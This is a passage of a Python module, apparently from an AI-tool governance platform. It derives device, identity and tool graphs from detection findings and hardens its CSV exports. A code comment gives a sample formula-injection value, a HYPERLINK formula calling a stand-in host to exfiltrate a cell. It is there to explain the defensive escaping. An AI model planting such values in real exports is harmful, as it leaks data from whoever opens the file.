"""Entity derivation over ai-guard findings.

Findings are a flat stream: each one is an isolated row. Everything a
governance view needs is a relationship - which tools a device has, which
devices a person uses, who is signed into what. This module builds those
relationships. It reads; it never writes back, and it never sits in the path
of anything that already works.

The graph has two entry points, because the sources differ:

  endpoint findings  carry a device and a local username. The username is a
                     hint, not an identity: it is firstname.lastname on a
                     Jamf Connect Mac, a local account on a Mac enrolled
                     before it, the work account on Autopilot Windows, and
                     whatever the person chose on unmanaged Linux. The device
                     is the reliable key.

  cloud findings     carry an identity and no device, because Entra and
                     Exchange know people, not machines.

They meet at the person, and that join is a lookup the deployer owns against
whatever they run: Jamf, Intune, an RMM, a CMDB, a CSV. This module does not
attempt it. Devices with no mapped person stay unattributed, which is a
first-class state and not an error - a small team with no MDM still gets
"these three machines are running Ollama on personal accounts", and that is
useful without a name on it.
"""

import csv
import io
import json
import math
import os
import re
import sys
import time
import urllib.parse
import urllib.request
from collections import defaultdict
from datetime import datetime, timedelta, timezone

from app import governance

# Surfaces that describe a machine. Anything else is identity-scoped and will
# not carry a device.
ENDPOINT_SURFACES = {"cli", "ide", "desktop", "mcp", "browser"}

# The bridge detector reports the resource an AI tool reached, not a tool
# someone installed. Slack, GitHub and Figma turning up in a tool inventory is
# the destination of an integration being mistaken for the integration itself.
# They are edges to a resource and belong in their own node type.
BRIDGE_SOURCES = {"sentinelone_bridge"}

# The platform's own control. It reports through the same path as a finding,
# but nobody is "using" it, so it does not belong in a tool inventory.
NOT_A_TOOL = {"paste-guard", "ai-guard-collector"}

# Sources that run ON a machine. Anything else knows the machine only from the
# outside: an inventory API, DNS telemetry. A device seen from outside but by
# no collector is a coverage gap, not a quiet machine.
COLLECTOR_SOURCES = {"collector-macos", "collector-linux", "collector-windows"}

# Coverage is judged on surface rather than source, because source is not
# reliably populated: the macOS collector sent none until recently and the
# browser extension predates the field entirely. Only something running on the
# machine can see a CLI config file, an editor extension or an MCP server
# definition, so these surfaces prove a collector ran there regardless of what
# the finding says about itself. Judging on source alone flagged every Mac in
# a fleet as uncovered while its cli and mcp findings sat in the same graph.
COLLECTOR_SURFACES = {"cli", "ide", "mcp", "endpoint"}


class Findings(list):
    """A list of findings that also says whether it is the WHOLE window.

    truncated=True means the read stopped at the safety cap and older
    findings in the window were not fetched - every count derived from it
    is a floor, not a total, and the pages say so. A plain list (a test
    double, say) reads as complete, which getattr callers get for free.
    """

    truncated = False


def fetch_from_loki(base, hours, token=None, limit=5000, username=None,
                    password=None, max_findings=100_000):
    """Pull findings from Loki, paginating until the window is exhausted.

    Loki caps one query_range response at `limit` entries. The old single
    request silently returned the newest 5,000 of a larger window, and
    every portal number - the register, the status page, the evidence
    manifest with its checksum - was then computed over a sample presented
    as the whole (issue #104). Now the read walks backward page by page
    until a page comes back short, or max_findings is hit - and hitting
    the cap is REPORTED, not swallowed: the result's truncated flag rides
    into the API responses and the evidence manifest.

    The boundary between pages is oldest-seen minus one nanosecond, so a
    finding sharing that exact nanosecond with the boundary entry could be
    skipped; receiver timestamps are time_ns() at ingest, which makes that
    collision effectively impossible.

    Two authentication shapes, because log stores disagree about which they
    want. A bearer token covers self-hosted Loki behind a gateway; basic
    auth is what Grafana Cloud and most hosted offerings use, where the
    username is a numeric instance id. Both may be set: a gateway that
    wants a bearer in front of a Loki that wants basic auth is a real
    arrangement. Built by hand rather than with HTTPBasicAuthHandler,
    which only sends credentials after a 401 with a realm it recognises -
    Grafana Cloud answers 401 without one, so the retry never carried the
    header.
    """
    import base64

    end = int(time.time() * 1e9)
    start = end - int(hours * 3600 * 1e9)

    def page(page_end):
        params = urllib.parse.urlencode({
            "query": '{app="ai-guard-receiver", kind="finding"}',
            "start": start,
            "end": page_end,
            "limit": limit,
            "direction": "backward",
        })
        req = urllib.request.Request(
            base.rstrip("/") + "/loki/api/v1/query_range?" + params)
        if username:
            creds = base64.b64encode(
                ("%s:%s" % (username, password or "")).encode()).decode()
            req.add_header("Authorization", "Basic " + creds)
        elif token:
            req.add_header("Authorization", "Bearer " + token)
        with urllib.request.urlopen(req, timeout=30) as resp:
            payload = json.load(resp)
        entries, raw = [], 0
        for stream in payload.get("data", {}).get("result", []):
            for ts, line in stream.get("values", []):
                raw += 1
                try:
                    entries.append((int(ts), json.loads(line)))
                except (json.JSONDecodeError, ValueError):
                    continue
        return entries, raw

    out = Findings()
    page_end = end
    while True:
        entries, raw = page(page_end)
        out.extend(e for _, e in entries)
        if raw < limit:
            break  # a short page: the window is exhausted
        if len(out) >= max_findings:
            out.truncated = True
            break
        oldest = min((ts for ts, _ in entries), default=None)
        if oldest is None or oldest <= start:
            break
        page_end = oldest - 1
    return out


def load_domain_map(path):
    """domain -> tool id, from the registry.

    Detectors disagree on what to call a tool: the browser extension reports
    the domain it saw, everything else reports the registry id, so one tool
    arrives as chatgpt.com and chatgpt. Resolving through the registry keeps
    the mapping in the one place that is already the source of truth.

    Accepts registry.yaml or the compiled registry.json, because which one is
    to hand depends on the deployment: a checkout has the source, the Helm
    chart and the demo ship the compiled artifact. Same shape either way.
    """
    if not path or not os.path.exists(path):
        print("registry not found at %s: tool names will not be normalised"
              % path, file=sys.stderr)
        return {}

    try:
        with open(path) as fh:
            if path.endswith(".json"):
                reg = json.load(fh)
            else:
                import yaml
                reg = yaml.safe_load(fh)
    except ImportError:
        print("pyyaml not installed: tool names will not be normalised",
              file=sys.stderr)
        return {}
    except Exception as e:
        print("could not read registry (%s): tool names will not be normalised"
              % e, file=sys.stderr)
        return {}

    return load_domain_map_from(reg)


def load_domain_map_from(reg):
    """The mapping itself, separated from reading a file so it can be tested
    without one."""
    out = {}
    for t in (reg or {}).get("tools", []):
        tid = t.get("id")
        if not tid:
            continue
        for d in t.get("domains", []) or []:
            out[str(d).lower()] = tid
    return out


def load_identity_map(path):
    """key,identity CSV. The key is a device or a local username, because
    which one a deployer can supply depends entirely on what they run: an MDM
    keys on serial, an RMM might only know a hostname, and a small team may
    have nothing but a spreadsheet of who sits at which machine.

    This platform does not resolve identity itself. It carries enough for a
    deployer to resolve it against whatever they have, and a device with no
    mapping stays unattributed, which is a legitimate answer rather than a
    failure."""
    if not path:
        return {}
    out = {}
    with open(path) as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            # Drop an inline comment. suggest_identity_csv writes the local
            # username it matched on after the value, so a deployer can see
            # why each row was proposed. Without this the comment became part
            # of the identity: feeding the tool's own suggested file straight
            # back in, which is what the docs tell you to do, put
            # "jo.bloggs  # via local user Jo.Bloggs" on every report.
            #
            # A hash cannot appear in a generated key or identity, so this
            # cannot truncate one. A hand-written file that puts a hash inside
            # a value loses the rest of it, which is the trade for a format
            # where a comment can follow a row.
            line = line.split("#", 1)[0].strip()
            if not line:
                continue
            # csv.reader rather than split(","). The exporter quotes with
            # csv.writer, and a parser that splits on the first comma reads a
            # quoted value as two fields and gets both wrong.
            row = next(csv.reader([line]), [])
            parts = [c.strip() for c in row[:2]]
            if len(parts) == 2 and parts[0] and parts[1]:
                if parts[0].lower() in ("key", "device", "local_user"):
                    continue  # header
                out[parts[0]] = parts[1]
    return out


def _norm_person(v):
    """Strip a name to something comparable across naming conventions.
    firstname.lastname on a Jamf Connect Mac, firstnamelastname on one
    enrolled before it, the UPN local-part from Entra."""
    v = (v or "").lower().split("@")[0]
    return "".join(ch for ch in v if ch.isalnum())


def suggest_identity_rows(devices, identities):
    """Propose device -> identity mappings by comparing normalised local
    usernames against known identities.

    Proposals, not conclusions. These are string matches: firstname.lastname
    on a Jamf Connect Mac happens to resemble the Entra UPN, and firstnamelastname
    on an older enrolment happens to resemble it too. Neither is authoritative,
    and a guess that looks right is how the wrong person ends up on a report.
    Everything here is for review before use."""
    by_norm = {}
    for ident in identities:
        by_norm.setdefault(_norm_person(ident), ident)

    matched, unmatched = [], []
    for dev, d in sorted(devices.items()):
        hit = None
        for lu in sorted(d["local_users"]):
            cand = by_norm.get(_norm_person(lu))
            if cand:
                hit = (lu, cand)
                break
        if not hit:
            # Nothing in the local usernames, so try what the machine is
            # called. A review of a live estate found five devices whose
            # hostname spelled out their owner's name - two of them
            # people already in the identity list - sitting unattributed
            # because the only rule looked at local users. Containment
            # rather than equality: a hostname is a name inside a label
            # ("firstname-lastname-macbook", "FIRSTNAMEs-MacBook-Pro"),
            # never the name alone.
            hit = _hostname_match(d, by_norm)
        if hit:
            matched.append({"key": dev, "identity": hit[1], "via": hit[0],
                            "device_name": d["device_name"]})
        else:
            unmatched.append({"key": dev, "local_users": sorted(d["local_users"]),
                              "device_name": d["device_name"]})
    return matched, unmatched


# Short normalised names match inside a hostname by accident - "al" is
# in "Alienware", "sam" is in "SAMSUNG". Long enough that a hit means
# something, and a proposal is reviewed before it is used anyway.
_MIN_HOSTNAME_NAME = 6


def _hostname_match(d, by_norm):
    """(what matched, identity) where a device's own name contains a
    known person's name, or None.

    The longest matching identity wins, so "jo.smith" is not proposed for
    a machine that names "jo.smithson". Ambiguity - two different people
    matching one hostname - proposes neither: the point of this file is
    that somebody reviews it, and a proposal that is wrong half the time
    costs more review than it saves.
    """
    hay = _norm_person(d.get("device_name") or "")
    if not hay:
        return None
    hits = [(norm, ident) for norm, ident in by_norm.items()
            if len(norm) >= _MIN_HOSTNAME_NAME and norm in hay]
    if not hits:
        return None
    hits.sort(key=lambda ni: len(ni[0]), reverse=True)
    if len(hits) > 1 and len(hits[0][0]) == len(hits[1][0]):
        return None
    return ("hostname %s" % (d.get("device_name") or ""), hits[0][1])


# A cell that a spreadsheet would run rather than display. csv handles commas
# and quotes; it has no opinion about formulas, because they are not a CSV
# concept at all. Excel, LibreOffice and Sheets all evaluate a cell beginning
# with one of these, so a device named =HYPERLINK("http://x/"&A1) exfiltrates
# the row next to it the moment somebody opens the export.
#
# Leading whitespace counts: a tab or carriage return before the character is
# stripped by the spreadsheet and the formula still runs.
_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value):
    """A cell a spreadsheet will display rather than evaluate.

    Prefixed with an apostrophe, which spreadsheets read as "treat what follows
    as text" and do not show. That is the conventional fix and it is visible in
    the raw file, which is the honest trade: the exported value is not byte
    identical to the finding, and a reader diffing the two should be able to
    see why.

    Applied to strings only. The counts are integers and cannot carry a
    formula.
    """
    s = "" if value is None else str(value)
    if not s:
        return s
    return "'" + s if (s[0] in _FORMULA_LEAD
                       or s.lstrip("\t\r\n ").startswith(_FORMULA_LEAD)) else s


# Characters that cannot appear in a key or an identity in this file.
#
# A newline is the one that matters: this file is line oriented, so a device
# key containing one plants a second row. Someone able to report a finding
# could propose an identity mapping nobody wrote, and if a deployer accepted
# the file, later reports would name the wrong person. That is a quiet failure
# in the only direction this platform must not fail quietly.
#
# A comma or a quote is handled by csv.writer, but a key containing either is
# not a device serial and a file that needs quoting is harder to hand-edit,
# which is what this format is for. A hash would collide with the inline
# comments below.
#
# Rejected rather than escaped, because every one of these means the value is
# already wrong. A rejected row is visible in the output; a quoted one looks
# deliberate.
_UNSAFE_IN_KEY = re.compile(r"[\x00-\x1f\x7f,\"'#]")


def suggest_identity_csv(matched, unmatched):
    """The same proposals as a CSV a deployer can save, edit and feed back.

    Rows are written with csv.writer and read back with csv.reader. The first
    version built and parsed both ends by hand, and a device key containing a
    newline therefore wrote an extra row: the guard added for spreadsheet
    formulas did nothing about it, because a formula and an injected record are
    different problems that happen to share a file.
    """
    buf = io.StringIO()
    w = csv.writer(buf, lineterminator="\n")

    out = [
        "# key,identity",
        "# Proposed from local usernames. REVIEW BEFORE USE: these are string",
        "# matches, not authoritative. Anything wrong here puts the wrong name",
        "# on a report.",
    ]
    skipped = []
    for m in matched:
        key, identity = str(m["key"]), str(m["identity"])
        if _UNSAFE_IN_KEY.search(key) or _UNSAFE_IN_KEY.search(identity):
            skipped.append(key)
            continue
        buf.seek(0), buf.truncate(0)
        w.writerow([csv_safe(key), csv_safe(identity)])
        out.append("%s  # via local user %s"
                   % (buf.getvalue().rstrip("\n"), _comment_safe(m["via"])))

    if skipped:
        out.append("#")
        out.append("# %d device%s left out: the key or the proposed identity "
                   % (len(skipped), "" if len(skipped) == 1 else "s")
                   + "contained a character that cannot appear in this file.")
        out.append("# Said out loud rather than dropped: a row missing without "
                   "explanation")
        out.append("# looks the same as a device nobody could name.")

    if unmatched:
        out.append("#")
        out.append("# No candidate identity. Fill these in from your MDM, RMM or CMDB:")
        for u in unmatched:
            out.append("# %s,   # local users: %s"
                       % (_comment_safe(u["key"]),
                          _comment_safe(", ".join(u["local_users"])) or "(none)"))
    return "\n".join(out) + "\n"


def _comment_safe(value):
    """A value safe to put in a comment: no newline, so it stays a comment.

    A commented-out row is still a row if the value inside it can end the line.
    The unmatched block had no guard at all, which the formula fix missed
    because it was only looking at the rows that were not commented.
    """
    return re.sub(r"[\x00-\x1f\x7f]", " ", str(value or ""))


def suggest_identities(devices, identities, path):
    """CLI convenience: write the proposals to a file."""
    matched, unmatched = suggest_identity_rows(devices, identities)
    with open(path, "w") as fh:
        fh.write(suggest_identity_csv(matched, unmatched))
    return len(matched), len(unmatched)


def read_file(path):
    """Newline-delimited JSON, one finding per line."""
    out = []
    with open(path) as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                out.append(json.loads(line))
            except json.JSONDecodeError:
                continue
    return out


def normalise_tool(name, domain_map):
    """Resolve a detector's name for a tool to the registry id where one
    exists. Returns the name unchanged when it does not: an unrecognised name
    is a registry gap, and silently folding it into something else would hide
    that."""
    if not name:
        return name
    key = name.lower()
    if key in domain_map:
        return domain_map[key]
    # Some detectors report a bare host that the registry lists with a
    # subdomain, or vice versa.
    if key.startswith("www."):
        key = key[4:]
        if key in domain_map:
            return domain_map[key]
    return name


def build(findings, domain_map=None, identity_map=None):
    devices = defaultdict(lambda: {
        "device_name": "", "os": set(), "tools": set(), "surfaces": set(),
        "local_users": set(), "sources": set(), "accounts": set(),
        "personal_accounts": set(), "findings": 0,
        # tool -> the account domains that tool was seen signed into on this
        # device. Kept paired rather than folded into the two flat sets above,
        # because "this device has chatgpt and claude-code" plus "this device
        # has gmail.com and example.com" cannot tell you which tool the
        # personal account belongs to, and that is the question worth asking.
        # An empty set is meaningful: the tool is present and no account
        # identity was captured, which is what a software inventory finding
        # gives you.
        "tool_accounts": defaultdict(set),
        "person": "", "collector_seen": False, "scanner_seen": False,
        "collector_version": "",
        # Other keys the same machine arrived under. Kept so the detail
        # view can show what each source called it, and so a lookup by
        # any of them still finds the device.
        "aliases": set(),
    })
    identities = defaultdict(lambda: {
        "tools": set(), "surfaces": set(), "sources": set(),
        "accounts": set(), "findings": 0, "devices": set(),
        # Other spellings of this person that sources reported.
        "aliases": set(),
    })
    # Tool nodes are keyed on the tool, with surface as an attribute. Merging
    # surfaces into one number would lose the distinction the platform exists
    # for: ChatGPT in a browser on a personal account is a different exposure
    # from the desktop app on a corporate one. The edges record which surface
    # each device was seen on, so a tool page can say "15 devices: 8 browser,
    # 5 desktop, 2 ide" rather than "15".
    tools = defaultdict(lambda: {
        "devices": set(), "identities": set(), "surfaces": set(),
        "accounts": set(), "findings": 0,
        "devices_by_surface": defaultdict(set),
        # Devices where something proved the MODEL ran, as opposed to
        # devices where the product was merely found installed. The two are
        # the same set for every tool except a VS Code fork, where an
        # inventory hit means an editor exists and nothing more. Kept as
        # devices rather than a finding count because the question people
        # ask of a licence is "how many of these seats are anyone using",
        # which is a count of machines, not of DNS lookups.
        "devices_active": set(),
        "active_findings": 0,
    })
    # Where an AI tool reached, per the bridge detector. Not a tool inventory.
    bridges = defaultdict(lambda: {"devices": set(), "findings": 0})
    unattributed = []
    domain_map = domain_map or {}
    identity_map = identity_map or {}

    for f in findings:
        tool = f.get("tool") or ""
        surface = f.get("surface") or ""
        device = (f.get("device") or "").strip()
        user = (f.get("user") or "").strip()
        acct = (f.get("account_domain") or "").strip().lower()
        source = f.get("source") or ""
        severity = f.get("severity") or ""
        if not tool:
            continue

        # Bridge targets and the guard itself are not tools people use.
        if source in BRIDGE_SOURCES:
            b = bridges[tool]
            b["findings"] += 1
            if device:
                b["devices"].add(device)
            continue
        # The platform's own agents are not tools people use, but their
        # findings still prove the agent ran on that machine, which is the
        # whole point of a heartbeat. Record coverage, then skip the tool
        # graph rather than skipping the finding entirely.
        if tool in NOT_A_TOOL:
            if device:
                d = devices[device]
                if f.get("device_name"):
                    d["device_name"] = f["device_name"]
                if source:
                    d["sources"].add(source)
                if user:
                    d["local_users"].add(user)
                if source in COLLECTOR_SOURCES or surface in COLLECTOR_SURFACES:
                    d["collector_seen"] = True
                ev = f.get("evidence") or ""
                if ev.startswith("heartbeat version="):
                    d["collector_version"] = ev.split("version=", 1)[1].split()[0]
            continue

        tool = normalise_tool(tool, domain_map)
        # One definition of "a tool in use", shared with the register.
        # An MCP finding names its tool <tool>-mcp, which is evidence the
        # tool is on that machine rather than a different tool - the
        # register has always folded it, and the estate views did not, so
        # the two pages disagreed about how many tools exist ("23 in use"
        # against "26 tools", and a register "0 not in registry" beside
        # three Inventory rows that are in no registry). The mcp surface
        # still attaches, and the servers themselves stay their own view.
        tool = _base_tool(tool)

        t = tools[tool]
        t["surfaces"].add(surface)
        t["findings"] += 1
        active = (f.get("signal") or "active") != "ambient"
        if active:
            t["active_findings"] += 1
            if device:
                t["devices_active"].add(device)
        if acct:
            t["accounts"].add(acct)

        if device:
            d = devices[device]
            d["findings"] += 1
            d["tools"].add(tool)
            d["surfaces"].add(surface)
            if f.get("device_name"):
                d["device_name"] = f["device_name"]
            if f.get("os"):
                d["os"].add(f["os"])
            if user:
                d["local_users"].add(user)
            if source:
                d["sources"].add(source)
                if source not in COLLECTOR_SOURCES:
                    d["scanner_seen"] = True
            if source in COLLECTOR_SOURCES or surface in COLLECTOR_SURFACES:
                d["collector_seen"] = True
            # The heartbeat carries the collector version, which is how a
            # rollout is watched: the version moving across the estate is the
            # only proof an update actually landed.
            ev = f.get("evidence") or ""
            if ev.startswith("heartbeat version="):
                d["collector_version"] = ev.split("version=", 1)[1].split()[0]
            # setdefault before the acct check: a tool with no account seen
            # has to appear in the mapping, or it silently vanishes from a
            # view whose whole job is showing which tools lack an account.
            d["tool_accounts"].setdefault(tool, set())
            if acct:
                d["accounts"].add(acct)
                d["tool_accounts"][tool].add(acct)
                if severity == "warn":
                    d["personal_accounts"].add(acct)
            t["devices"].add(device)
            t["devices_by_surface"][surface].add(device)

        # An identity is only meaningful where the source knows people rather
        # than machines. A local username on an endpoint is not an identity.
        elif user:
            i = identities[user]
            i["findings"] += 1
            i["tools"].add(tool)
            i["surfaces"].add(surface)
            if source:
                i["sources"].add(source)
            if acct:
                i["accounts"].add(acct)
            t["identities"].add(user)

        else:
            unattributed.append({
                "tool": tool, "surface": surface, "source": source,
                "evidence": f.get("evidence", ""),
            })

    # One machine, one device. Sources disagree about the key: an
    # endpoint collector reports an asset-tagged serial (ASSET-XXXX) and a
    # browser extension reports the bare one (XXXX), so the same laptop
    # arrived as two devices - two cards under one hostname, its tools
    # split across both, and a personal-account row that could not find
    # the person the other half already knew. Merge before anything is
    # counted or attributed.
    for bare, canon in _device_aliases(devices).items():
        src, dst = devices.pop(bare), devices[canon]
        for field in ("os", "tools", "surfaces", "local_users", "sources",
                      "accounts", "personal_accounts"):
            dst[field] |= src[field]
        for tool, accts in src["tool_accounts"].items():
            dst["tool_accounts"].setdefault(tool, set())
            dst["tool_accounts"][tool] |= accts
        dst["findings"] += src["findings"]
        dst["device_name"] = dst["device_name"] or src["device_name"]
        dst["collector_seen"] = dst["collector_seen"] or src["collector_seen"]
        dst["scanner_seen"] = dst["scanner_seen"] or src["scanner_seen"]
        dst["collector_version"] = (dst["collector_version"]
                                    or src["collector_version"])
        dst["aliases"].add(bare)
        # Every tool edge pointed at the key that just went away.
        for t in tools.values():
            if bare in t["devices"]:
                t["devices"].discard(bare)
                t["devices"].add(canon)
            for surf, ds in t["devices_by_surface"].items():
                if bare in ds:
                    ds.discard(bare)
                    ds.add(canon)
        for b in bridges.values():
            if bare in b["devices"]:
                b["devices"].discard(bare)
                b["devices"].add(canon)

    # Attach a person to each device, if the deployer supplied a mapping.
    # Device key first, then any local username: an MDM keys on the serial, a
    # spreadsheet is more likely to key on the name someone logs in with.
    for key, d in devices.items():
        person = identity_map.get(key)
        if not person:
            # Then the keys this device was merged from. The canonical key
            # is the longer, prefixed one, so a machine the collector calls
            # ASSET-C02ABCD swallows the C02ABCD the extension reports - and
            # an MDM export lists the bare serial, which is what a deployer
            # builds the map from. Mapping the serial looked right, matched
            # in the preview, and attached to nothing.
            for alias in d["aliases"]:
                if alias in identity_map:
                    person = identity_map[alias]
                    break
        if not person:
            for lu in d["local_users"]:
                if lu in identity_map:
                    person = identity_map[lu]
                    break
        if person:
            d["person"] = person
            i = identities[person]
            i["devices"] = i.get("devices", set())
            i["devices"].add(key)
            i["tools"] |= d["tools"]
            i["surfaces"] |= d["surfaces"]

    # One person, one identity - AFTER attribution, not before. A cloud
    # sign-in creates an identity directly; the other spelling of the
    # same colleague often exists only because the identity map attached
    # it to a device just above, so merging any earlier compares one
    # spelling against a name that does not exist yet and leaves the two
    # rows the merge was written to collapse.
    for variant, canon in _identity_aliases(
            identities, set(identity_map.values())).items():
        src, dst = identities.pop(variant), identities[canon]
        for field in ("tools", "surfaces", "sources", "accounts", "devices"):
            dst[field] = (dst.get(field) or set()) | (src.get(field) or set())
        dst["findings"] += src["findings"]
        dst["aliases"].add(variant)
        for t in tools.values():
            if variant in t["identities"]:
                t["identities"].discard(variant)
                t["identities"].add(canon)
        # A device attributed to the variant now names the person the
        # rest of the product shows.
        for d in devices.values():
            if d.get("person") == variant:
                d["person"] = canon

    return devices, identities, tools, bridges, unattributed


# Long enough that a shared suffix means something. Six characters of
# serial matching by accident is a stretch; two or three is not, and
# merging a junk key like "A" into "ASSET-A" would be worse than the split
# it fixes.
_MIN_ALIAS_KEY = 6
_ALIAS_SEPARATORS = ("-", "_", ".", ":")


def _identity_aliases(identities, preferred=()):
    """{variant: canonical} where two identity strings are the same
    person spelled differently.

    A cloud source supplies a UPN local part (jeff.gillings), another
    supplies a display name (jeff gillings), and the estate carried them
    as two people: two rows on People, one of them "unmapped" because
    the identity map attached the device to the other spelling, and both
    reaching a finance report as separate unlicensed users.

    Normalisation is the existing one - lowercase, alphanumerics only,
    local part of an address - so a merge needs the letters to be
    identical. Two genuinely different people would have to share a name
    exactly, and no source could tell them apart either.
    """
    preferred = set(preferred or ())
    by_norm = {}
    for name in identities:
        norm = _norm_person(name)
        if norm:
            by_norm.setdefault(norm, []).append(name)
    out = {}
    for names in by_norm.values():
        if len(names) < 2:
            continue
        # A spelling somebody typed into the identity map wins: that is a
        # deliberate choice about what to call a colleague, and a source's
        # spelling is an accident of how the source stores names. After
        # that, the spelling seen most often, then alphabetically so the
        # answer does not move between reads.
        canon = sorted(names, key=lambda n: (n not in preferred,
                                             -identities[n]["findings"],
                                             n))[0]
        for n in names:
            if n != canon:
                out[n] = canon
    return out


def _device_aliases(devices):
    """{bare key: canonical key} where one key is another with a source
    prefix on the front.

    Only prefix-and-separator relationships count, and only where the
    bare key is long enough to be an identifier rather than a label. An
    ambiguous bare key - one that is the tail of two different prefixed
    keys - is left alone: merging the wrong pair of machines is worse
    than showing two cards.

    Read by index rather than by comparing every pair. The relation being
    computed is "does some key end with <separator><bare>", and that
    question is invertible: instead of testing each key against every
    other, take each key's own post-separator tails and look those up
    among the bare keys. A key has a handful of separators in it, so the
    cost tracks the number of devices rather than its square.

    That is not a micro-optimisation. The pairwise form was the whole
    cost of a graph build on any real estate - 99% of it, quadratic in
    device count, which is 1.2s at four thousand devices and 33s at
    twenty thousand. A portal that takes half a minute to answer is one
    people stop opening.

    The relation is unchanged, and the tests either side of this say so:
    the minimum length, the ambiguity refusal and the chain refusal all
    mean exactly what they meant before.
    """
    keys = [k for k in devices if k]
    lowered = {k: k.lower() for k in keys}
    # Lowered bare form -> the keys spelling it. A list, because two keys
    # can differ only in case and both are still candidates.
    by_low = {}
    for k in keys:
        low = lowered[k]
        if len(low) >= _MIN_ALIAS_KEY:
            by_low.setdefault(low, []).append(k)

    out, ambiguous = {}, set()
    for other in keys:
        o = lowered[other]
        # Every tail of `other` that follows a separator. A set because
        # each (bare, other) pair must be weighed once, exactly as the
        # pairwise form weighed it once.
        tails = set()
        for i, ch in enumerate(o):
            if ch in _ALIAS_SEPARATORS and len(o) - i - 1 >= _MIN_ALIAS_KEY:
                tails.add(o[i + 1:])
        for tail in tails:
            for bare in by_low.get(tail, ()):
                if bare == other:
                    continue
                if bare in out:
                    ambiguous.add(bare)
                out[bare] = other

    for k in ambiguous:
        out.pop(k, None)
    # A key cannot be both a bare form and a canonical one: A -> B while
    # B -> C would drop A's findings onto a key that is itself merging
    # away. Rare, but cheap to refuse.
    return {b: c for b, c in out.items() if c not in out}


# in-use  something proved a model ran: an account, a sign-in, an MCP config,
#         or DNS to the completion backend.
# installed  the product was only ever found sitting on disk. Reachable only
#         for a registry entry marked `form: ide` - a VS Code fork, useful
#         all day without calling a model - so every other tool is in-use the
#         moment it is seen at all, exactly as before.
#
# The distinction is what stops "23 tools in use" quietly meaning "23 editors
# installed", and it is the third column the Budget view needs: seats paid
# for, seats installed, seats anyone actually used.
def tool_usage(t) -> str:
    return "in-use" if t.get("active_findings") else "installed"


def jsonable(d):
    return {k: (sorted(v) if isinstance(v, set) else v) for k, v in d.items()}


def _domain_matches(account, listed):
    """Is `account` this domain, or a subdomain of it?

    Both sides are normalised - trimmed, lowercased, leading dots and a
    leading www. removed - because the two lists are typed by different
    people at different times: corporate domains come from an operator in
    Settings, the account domain from whatever the reporting agent read.
    Suffix rather than equality so mail.corp.example matches corp.example.
    """
    a = (account or "").strip().lower().lstrip(".")
    b = (listed or "").strip().lower().lstrip(".")
    if not a or not b:
        return False
    if a.startswith("www."):
        a = a[4:]
    return a == b or a.endswith("." + b)


def personal_accounts_from(findings, domain_map=None, corp_domains=None,
                           tool_domains=None, device_person=None,
                           identity_canon=None):
    """One row per personal account seen on a tool, with when it was first and
    last observed.

    "Personal" is severity == "warn" with an account domain present, which is
    the reporter's own judgement: the collector and the extension are told the
    corporate domains and decide at the point of detection. The portal does not
    re-derive it, because it may not hold the same list, and two definitions
    that disagree is worse than one that is occasionally coarse.

    Rows are keyed on the full tuple rather than on the account alone. The same
    person signing into ChatGPT on a laptop and Claude on a desktop is two
    findings worth following up separately, not one account with a longer list
    of attributes.
    """
    domain_map = domain_map or {}
    corp_domains = corp_domains or []
    tool_domains = tool_domains or {}
    # {device key (canonical or alias): (canonical key, person)}. A
    # browser extension reports no user, so its rows read "no identity"
    # even where the estate had already attached a person to that exact
    # machine through the identity map - the same person named on the
    # cli row directly above. Nothing here invents an identity: it
    # resolves the one the device inventory already holds, and says the
    # attribution came from the device rather than the source.
    device_person = device_person or {}
    # Normalised name -> the spelling People shows, so the two views
    # cannot name the same person differently. Keyed on the normalised
    # form rather than on known variants: the spelling that reaches a
    # personal-account row often comes from a finding that carries a
    # device, which never becomes an identity of its own, so there is no
    # variant to look up - only a name that normalises to the same
    # person.
    identity_canon = identity_canon or {}
    rows = {}
    for f in findings:
        if (f.get("severity") or "") != "warn":
            continue
        acct = (f.get("account_domain") or "").strip().lower()
        if not acct:
            continue
        tool = f.get("tool") or ""
        if not tool or tool in NOT_A_TOOL:
            continue
        source = f.get("source") or ""
        if source in BRIDGE_SOURCES:
            continue
        tool = normalise_tool(tool, domain_map)

        # Severity is the reporter's judgement, made against the corporate
        # domain list IT HELD AT THE TIME. A browser extension carries that
        # list baked into its policy, so a domain added in Settings after
        # the last policy push keeps arriving flagged as personal - and a
        # domain that is literally in the operator's own list then appears
        # under "personal accounts", including in the shareable budget
        # report. The reporter is not re-judged here (that would be two
        # definitions of personal); the row is simply not presented as
        # personal when the current list says otherwise.
        if any(_domain_matches(acct, d) for d in corp_domains):
            continue

        # A tool's own sign-in domain is not a personal account on that
        # tool. Signing into the meeting-notes product with an account on
        # the meeting-notes product's domain was being reported as
        # personal use of the licence being paid for.
        if any(_domain_matches(acct, d) for d in tool_domains.get(tool, ())):
            continue

        device = (f.get("device") or "").strip()
        user = (f.get("user") or "").strip()
        if user:
            user = identity_canon.get(_norm_person(user), user)
        canon, via = device, ""
        if device in device_person:
            canon, person = device_person[device]
            if not user and person:
                user, via = person, "device"
        device = canon
        key = (user, acct, tool, device)
        r = rows.get(key)
        if r is None:
            r = rows[key] = {
                "user": user, "account_domain": acct, "tool": tool,
                # "" when the source named the person, "device" when the
                # identity map named them through the machine.
                "user_via": via,
                "device": device, "device_name": "", "os": "",
                "surfaces": set(), "sources": set(),
                "first_seen": "", "last_seen": "", "findings": 0,
            }
        r["findings"] += 1
        if f.get("device_name"):
            r["device_name"] = f["device_name"]
        if f.get("os"):
            r["os"] = f["os"]
        if f.get("surface"):
            r["surfaces"].add(f["surface"])
        if source:
            r["sources"].add(source)
        # ISO 8601 in UTC sorts lexically, which is the whole reason the
        # receiver writes it that way.
        ts = f.get("reported_at") or ""
        if ts:
            if not r["first_seen"] or ts < r["first_seen"]:
                r["first_seen"] = ts
            r["last_seen"] = max(r["last_seen"], ts)

    out = [dict(r, surfaces=sorted(r["surfaces"]), sources=sorted(r["sources"]))
           for r in rows.values()]
    # Most recently seen first: the useful question is what is happening now,
    # not what happened first.
    out.sort(key=lambda r: (r["last_seen"], r["user"], r["tool"]), reverse=True)
    return out


def mcp_from(findings):
    """One row per MCP server, with the tools that configured it and the
    devices it was found on.

    An MCP server is a standing integration rather than an application someone
    opens: it holds its own credentials and can reach whatever it was pointed
    at without the configuring tool being in use. Counting tools instead of
    servers would answer the less interesting question.

    Two evidence formats are read, because Loki holds both for as long as the
    lookback window. The current collectors emit

